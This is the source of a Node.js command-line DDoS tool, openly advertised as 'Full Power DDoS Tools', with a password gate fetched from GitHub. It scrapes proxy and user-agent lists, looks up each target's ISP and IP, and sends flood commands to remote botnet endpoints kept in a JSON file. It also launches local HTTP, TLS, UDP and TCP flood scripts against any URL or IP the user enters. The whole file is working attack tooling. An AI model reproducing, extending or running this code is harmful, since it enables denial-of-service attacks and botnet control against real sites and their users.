#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.9'
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m';
const ungu = '\x1b[35m';
const duhle = '\x1b[38;2;0;0;128m';
const hijau = '\x1b[38;2;144;238;144m'

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
    console.clear();
    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleDateString('id-ID', {
        month: 'short',
        day: '2-digit',
        year: 'numeric',
    });

    const bannerText = `
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${hijau}Welcome to PermenMD-X-Dzky Script${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m          ${hijau}Full Power DDoS Tools${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m ______________________________________________
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m     Telegram: ${biru}@Dzkyoffc${Reset}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m     Channel: ${biru}t.me/DzkyyCH${Reset}
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Version: ${version}
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     VIP: Yes
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Max time: 500
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Expired: ∞
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m     Online Date: ${bold}${biru}${formattedDate}${Reset}
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

Welcome to my DDoS tools!!! you can contact me if you find a bug
Type ${bold}${hijau}"srvmenu"${Reset} For Showing All Server Menu
========================================================================`;
    console.log(bannerText);
}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent url`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Supranicol/siunn/main/sukibatjjuurr/verr.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Supranicol/cache/main/log.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question(`${back_putih}${teksmerah}Input Password${Reset}: `, async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To ${biru}Dzky${Reset} ${hijau}DDoS Tools!${Reset}${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type ${hijau}"help"${Reset} For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //

async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <duration> <methods>
srvattack https://google.com 120 ninja`);
        sigma();
        return;
    }
    const [target, duration, methods] = args;
    const validMethods = ["ninja", "tls", "https", "glory", "proxy", "proxy2", "kill", "strike", "bypass", "mix", "raw", "browsers", "rapid", "pidoras", "pidoras2", "quantum", "storm", "cibi", "uam", "chaptca", "vsebypass", "vseflood"];
    if (!validMethods.includes(methods.toLowerCase())) {
        console.error(`Method Is Not Organized. Type [ ${bold}${ungu}'srvmenu'${Reset} ] For Check Available Methods`);
        sigma();
        return;
    }
    let result;

    async function printWithDelay(text, delay = 26) {
        const lines = text.split("\n");
        for (let line of lines) {
            console.log(line);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        const currentDate = new Date();
        const formattedDate = currentDate.toLocaleDateString('id-ID', {
            month: 'short',
            day: '2-digit',
            year: 'numeric',
        });
        
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
        console.clear();
        const attackLog = `
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠁⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${hijau}Please do not spam attack wait until this attack is over${Reset}
_________________________________________________________________________________________________
${bold}${teksmerah}Server Attack Has Been Sent${Reset}

${back_putih}${duhle}∆ Attack Information:${Reset}
► Target: ${bold}${teksmerah}(${Reset} ${bold}${target}${Reset} ${bold}${teksmerah})${Reset}
► Duration: ${bold}${teksmerah}(${Reset} ${bold}${duration} Seconds${Reset} ${bold}${teksmerah})${Reset}
► Methods: ${bold}${teksmerah}(${Reset} ${bold}${methods}${Reset} ${bold}${teksmerah})${Reset}
► Concurrents: 1/1
► Sent On: ${bold}${teksmerah}(${Reset} ${bold}${formattedDate}${Reset} ${bold}${teksmerah})${Reset}

${back_putih}${duhle}∆ Target Detail:${Reset}
► ISP: ${bold}${teksmerah}(${Reset} ${bold}${result.isp}${Reset} ${bold}${teksmerah})${Reset}
► IP: ${bold}${teksmerah}(${Reset} ${bold}${result.query}${Reset} ${bold}${teksmerah})${Reset}
► AS: ${bold}${teksmerah}(${Reset} ${bold}${result.as}${Reset} ${bold}${teksmerah})${Reset}

After Attack Please Type ${bold}${ungu}'cls'${Reset} To Clear Terminal And Back To Home`;
//Tiru aja bang gpp gw doain cepet ketemu ajal
        await printWithDelay(attackLog, 26);

    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
    sigma();
}

async function AttackBotnet(args) {
    if (args.length < 3) {
        console.log(`Example: botnet <target> <port> <duration> <methods>
botnet 111.22.333.4 53 120 udp`);
        sigma();
        return;
    }
    const [target, ports, duration, methods] = args;
    const validMethods = ["udp", "tcp", "ssh"];
    if (!validMethods.includes(methods.toLowerCase())) {
        console.error(`Method Is Not Organized. Type [ ${bold}${ungu}'srvmenu'${Reset} ] For Check Available Methods`);
        sigma();
        return;
        }

    let result;

    async function printWithDelay(text, delay = 26) {
        const lines = text.split("\n");
        for (let line of lines) {
            console.log(line);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    try {
        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        const currentDate = new Date();
        const formattedDate = currentDate.toLocaleDateString('id-ID', {
            month: 'short',
            day: '2-digit',
            year: 'numeric',
        });
        
        processList.push({ target, methods, startTime, duration, endTime });
        console.clear();
        const attackLog = `
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠁⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${hijau}Please do not spam attack wait until this attack is over${Reset}
__________________________________________________________________________________________
${bold}${teksmerah}Botnet Attack Layer 4 Has Been Launched${Reset}
${back_putih}${duhle}∆ Attack Information:${Reset}
► Target: ${bold}${teksmerah}(${Reset} ${bold}${target}${Reset} ${bold}${teksmerah})${Reset}
► Port:  ${bold}${teksmerah}(${Reset} ${bold}${ports}${Reset} ${bold}${teksmerah})${Reset}
► Duration: ${bold}${teksmerah}(${Reset} ${bold}${duration} Seconds${Reset} ${bold}${teksmerah})${Reset}
► Methods: ${bold}${teksmerah}(${Reset} ${bold}${methods}${Reset} ${bold}${teksmerah})${Reset}
► Sent On: ${bold}${teksmerah}(${Reset} ${bold}${formattedDate}${Reset} ${bold}${teksmerah})${Reset}

After Attack Please Type [ ${bold}${ungu}'cls'${Reset} ] To Clear Terminal And Back To Home`;
//Tiru aja bang gpp gw doain cepet ketemu ajal awokawokawok
        await printWithDelay(attackLog, 26);

    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=http://${target}&ports=${ports}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
    sigma();
}


async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma()
            return          
        }

        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }


        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // == 
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`;

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });


    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

   
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}

// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m     ${bold}${teksmerah}Attack Successfully Sent${Reset}
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m     Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m  ______________________________________________\n
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m   ∆ Attack Information:
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m    - Target: ${target}
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m    - Duration: ${duration} sec
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Methods: ${methods}
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - Concurrents: 1/1
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m 
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   ∆ Target Detail:
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - ISP: [ ${cyan}${result.isp}${Reset} ]
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - IP: [ ${cyan}${result.query}${Reset} ]
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - AS: [ ${cyan}${result.as}${Reset} ]
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${bold}${hijau}Please do not spam attack wait until this attack is over${Reset}
========================================================================

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 5 2 proxy.txt`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 2`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 2 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 2 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 2 proxy.txt 7 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 10 proxy.txt`)
          sigma()
          } else if (methods === 'quantum') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 2 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
